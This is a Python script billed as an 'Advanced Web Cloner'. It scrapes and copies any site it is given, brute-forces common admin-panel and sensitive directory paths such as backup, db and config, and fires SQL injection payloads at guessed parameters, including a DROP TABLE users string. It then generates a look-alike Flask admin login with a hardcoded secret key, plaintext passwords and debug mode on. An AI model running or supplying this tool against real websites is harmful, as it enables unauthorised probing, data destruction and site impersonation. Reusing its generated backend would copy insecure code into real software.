import os
import asyncio
import requests
from urllib.parse import urljoin, urlparse
from playwright.async_api import async_playwright
from bs4 import BeautifulSoup
import re
import logging
import itertools

# Configuration
LOG_FILE = "tool_log.txt"
OUTPUT_DIR = "./cloned_sites"
COMMON_ADMIN_PATHS = [
    "admin", "login", "dashboard", "cpanel", "backend", "administrator",
    "adminpanel", "user", "admin/login", "admin/dashboard", "admin.html", "admin.php"
]
COMMON_DIRECTORIES = [
    "backup", "db", "database", "config", "logs", "sql", "uploads", "files", "assets", "scripts", "styles"
]
COMMON_SQL_INJECTION_PAYLOADS = [
    "'", "' OR 1=1 --", '" OR 1=1 --', "'; DROP TABLE users; --"
]

# Logging Setup
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

# Utility Functions
def sanitize_filename(name):
    return re.sub(r'[\/:*?"<>|]', "_", name)

def create_directory(path):
    if not os.path.exists(path):
        os.makedirs(path)

def save_file(content, path):
    with open(path, "wb") as file:
        file.write(content)

def log_error(message):
    logging.error(message)

# Advanced Scraping
async def scrape_website(base_url, output_dir):
    visited = set()
    create_directory(output_dir)

    async def scrape_page(page, url):
        try:
            if url in visited:
                return
            visited.add(url)
            print(f"Scraping: {url}")
            await page.goto(url, timeout=60000)
            content = await page.content()

            # Save the main HTML page
            domain = urlparse(url).hostname
            page_output_dir = os.path.join(output_dir, sanitize_filename(domain))
            create_directory(page_output_dir)
            html_path = os.path.join(page_output_dir, "index.html")
            save_file(content.encode(), html_path)

            # Extract all resources
            resources = await page.evaluate("""
                Array.from(document.querySelectorAll('link[href], script[src], img[src]')).map(el => el.href || el.src)
            """)
            for resource_url in resources:
                resource_url = urljoin(url, resource_url)
                try:
                    r = requests.get(resource_url, timeout=10)
                    if r.status_code == 200:
                        filename = os.path.basename(urlparse(resource_url).path)
                        if not filename:
                            filename = "resource"
                        resource_path = os.path.join(page_output_dir, filename)
                        save_file(r.content, resource_path)
                except Exception as e:
                    log_error(f"Failed to download resource {resource_url}: {e}")
        except Exception as e:
            log_error(f"Error scraping {url}: {e}")

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        await scrape_page(page, base_url)
        await browser.close()

# Admin Panel Finder
def find_admin_panels(base_url):
    print("Searching for admin panels...")
    found_panels = []
    for path in COMMON_ADMIN_PATHS:
        url = urljoin(base_url, path)
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                print(f"Admin panel found: {url}")
                found_panels.append(url)
        except Exception as e:
            log_error(f"Failed to check admin path {url}: {e}")
    return found_panels

# Directory Traversal
def find_directories(base_url):
    print("Searching for directories...")
    found_directories = []
    for path in COMMON_DIRECTORIES:
        url = urljoin(base_url, path)
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                print(f"Exposed directory found: {url}")
                found_directories.append(url)
        except Exception as e:
            log_error(f"Failed to check directory {url}: {e}")
    return found_directories

# SQL Injection Testing
def test_sql_injection(base_url):
    print("Testing for SQL injection vulnerabilities...")
    vulnerable_urls = []
    query_params = ["id", "user", "product", "item"]

    for param in query_params:
        for payload in COMMON_SQL_INJECTION_PAYLOADS:
            url = f"{base_url}?{param}={payload}"
            try:
                response = requests.get(url, timeout=10)
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    print(f"Potential SQL Injection found: {url}")
                    vulnerable_urls.append(url)
            except Exception as e:
                log_error(f"Failed SQL injection test on {url}: {e}")
    return vulnerable_urls

# Generate Replica Backend
def generate_backend(base_url, output_dir):
    site_name = sanitize_filename(urlparse(base_url).hostname)
    backend_dir = os.path.join(output_dir, site_name, "backend")
    create_directory(backend_dir)
    create_directory(os.path.join(backend_dir, "templates"))

    app_code = f"""
from flask import Flask, render_template, request, redirect, url_for, session
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.secret_key = "super_secret_key"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///{site_name}.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), unique=True, nullable=False)
    password = db.Column(db.String(150), nullable=False)

@app.route("/")
def index():
    return "Welcome to the Admin Panel! <a href='/admin'>Admin Login</a>"

@app.route("/admin", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        admin = Admin.query.filter_by(username=username, password=password).first()
        if admin:
            session["admin_id"] = admin.id
            return redirect("/dashboard")
        return "Invalid credentials, try again!"
    return render_template("admin.html")

@app.route("/dashboard")
def dashboard():
    if "admin_id" not in session:
        return redirect("/admin")
    return "<h1>Admin Dashboard</h1><p>Manage your website here.</p>"

if __name__ == "__main__":
    db.create_all()
    app.run(debug=True)
    """
    # Save Flask app
    with open(os.path.join(backend_dir, "app.py"), "w") as app_file:
        app_file.write(app_code)

    admin_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Admin Login</title>
</head>
<body>
    <h2>Admin Login</h2>
    <form method="POST">
        <label for="username">Username:</label>
        <input type="text" name="username" required><br>
        <label for="password">Password:</label>
        <input type="password" name="password" required><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
    """
    with open(os.path.join(backend_dir, "templates", "admin.html"), "w") as html_file:
        html_file.write(admin_html)

# Main Execution
def main():
    print("Starting Advanced Web Cloner...")
    base_url = input("Enter the website URL to scrape: ").strip()
    output_dir = os.path.join(OUTPUT_DIR, sanitize_filename(urlparse(base_url).hostname))
    asyncio.run(scrape_website(base_url, output_dir))

    print("Searching for admin panels...")
    admin_panels = find_admin_panels(base_url)
    if admin_panels:
        print("Admin panels found:")
        for panel in admin_panels:
            print(f"- {panel}")
    else:
        print("No admin panels found.")

    print("Searching for exposed directories...")
    directories = find_directories(base_url)
    if directories:
        print("Exposed directories found:")
        for directory in directories:
            print(f"- {directory}")
    else:
        print("No exposed directories found.")

    print("Testing for SQL injection...")
    vulnerable_urls = test_sql_injection(base_url)
    if vulnerable_urls:
        print("SQL injection vulnerabilities found:")
        for url in vulnerable_urls:
            print(f"- {url}")
    else:
        print("No SQL injection vulnerabilities found.")

    print("Generating replica backend...")
    generate_backend(base_url, output_dir)
    print(f"Cloning completed. Output saved to {output_dir}.")

if __name__ == "__main__":
    main()
